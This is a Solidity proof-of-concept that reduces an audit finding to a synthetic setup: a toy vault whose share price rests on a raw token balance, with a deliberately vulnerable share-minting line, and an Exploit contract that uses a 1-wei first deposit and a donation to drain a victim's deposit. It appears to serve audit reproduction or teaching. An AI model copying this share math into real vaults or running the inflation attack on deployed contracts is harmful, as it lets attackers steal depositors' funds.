// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Regnum Aurum — H-18 inflation attack in the RWA vault (Pashov, 2025-05-06)
    SYNTHETIC, cheatcode-free reduction.
    totalValue() is the adapter's raw token balance, and a later deposit mints
    shares with deposited * supply / totalAssets. A 1-wei first deposit plus a
    direct donation makes the victim's 1000 ether deposit mint 0 shares.
    The 1 share then redeems the victim's 1000 ether. */

contract ERC20 {
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s, uint8 d) {
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract VaultAdapter {
    ERC20 public token;

    constructor(ERC20 t) {
        token = t;
    }

    function totalValue() external view returns (uint256) {
        uint256 amount = token.balanceOf(address(this));
        return amount; // S2 raw balance, a donation changes the share price
    }

    function deposit(uint256 amount, address from) external returns (uint256) {
        token.transferFrom(from, address(this), amount);
        return amount;
    }

    function pay(address to, uint256 amount) external {
        token.transfer(to, amount);
    }
}

contract RWAVault {
    ERC20 public vaultToken;
    VaultAdapter public adapter;
    mapping(address => uint256) public shares;
    uint256 public supply;

    constructor(ERC20 t, VaultAdapter a) {
        vaultToken = t;
        adapter = a;
    }

    function totalAssets() public view returns (uint256 totalValue) {
        totalValue += adapter.totalValue();
        return totalValue;
    }

    function depositAsset(uint256 amount, address receiver) external returns (uint256 sharesMinted) {
        require(receiver != address(0), "receiver");
        uint256 assetsBefore = totalAssets();
        uint256 supplyBefore = supply;
        uint256 depositedAssetValue = adapter.deposit(amount, msg.sender);
        if (supplyBefore == 0 || assetsBefore == 0) {
            sharesMinted = depositedAssetValue;
        } else {
            sharesMinted = (depositedAssetValue * supplyBefore) / assetsBefore; // @> VULN: donation inflates assetsBefore, so this floors to 0
        }
        shares[receiver] += sharesMinted;
        supply += sharesMinted;
    }

    function redeem(uint256 shareAmount, address receiver) external returns (uint256 assets) {
        assets = (shareAmount * totalAssets()) / supply; // S6
        shares[msg.sender] -= shareAmount;
        supply -= shareAmount;
        adapter.pay(receiver, assets);
    }
}

contract Victim {
    function deposit(RWAVault vault, ERC20 token, VaultAdapter adapter, uint256 amount) external {
        token.approve(address(adapter), amount); // S4
        vault.depositAsset(amount, address(this));
    }
}

contract Sink {}

contract Exploit {
    uint256 public constant FINDING = 66359;
    ERC20 public token;
    VaultAdapter public adapter;
    RWAVault public vault;
    Victim public victim;
    Sink public sink;

    constructor() {
        token = new ERC20("iRAAC", 18);
        adapter = new VaultAdapter(token);
        vault = new RWAVault(token, adapter);
        victim = new Victim();
        sink = new Sink();
    }

    function run() external {
        uint256 donate = 1000 ether;
        uint256 victimAmt = 1000 ether;
        token.mint(address(this), donate + 1);
        token.mint(address(victim), victimAmt);
        token.approve(address(adapter), 1);
        vault.depositAsset(1, address(this)); // S1 first depositor, 1 wei, 1 share
        token.transfer(address(adapter), donate); // S3 donation, no shares minted
        victim.deposit(vault, token, adapter, victimAmt);
        require(vault.shares(address(victim)) == 0, "victim shares");
        uint256 assets = vault.redeem(1, address(this));
        require(assets == donate + victimAmt + 1, "redeemed pot");
        token.transfer(address(sink), victimAmt); // S7 extracted deposit
        require(token.balanceOf(address(sink)) == victimAmt, "stolen");
        require(token.balanceOf(address(victim)) == 0, "victim drained");
    }
}
